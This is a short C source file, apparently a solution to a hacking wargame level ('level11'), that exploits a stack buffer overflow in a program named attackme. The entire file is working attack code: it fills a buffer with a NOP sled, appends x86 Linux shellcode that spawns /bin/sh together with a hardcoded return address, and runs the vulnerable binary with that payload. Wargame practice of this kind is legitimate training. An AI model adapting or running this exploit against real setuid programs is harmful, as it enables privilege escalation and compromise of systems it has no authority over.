/*
 * Author : superdk@hanmail.net
 * DATA : exploit for level11
 * LICENSE : GNU License
 */

#include <stdio.h>
#include <stdlib.h>

#define VICTIM "/home/level11/attackme "
#define NOP 0x90
#define BUFSIZE 272 /* NOP(219) + shellcode(45) + sfp(4) + ret(4)*/

char shellcode[] =
	"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
	"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
	"\x80\xe8\xdc\xff\xff\xff/bin/sh"
	"\x55\xf2\xff\xbf";

int main( )
{
	char cmdBuf[BUFSIZE];
	int i, j, shellLen;

	shellLen = strlen(shellcode);

	for(i=0; i<sizeof(cmdBuf)-shellLen; i++)
		cmdBuf[i] = NOP;
	printf("I : %d\n", i);
	
	for(j=0; j<shellLen; j++)
		cmdBuf[i++] = shellcode[j];
	printf("I : %d \n", i);
	
	execl(VICTIM, VICTIM, cmdBuf, 0);
}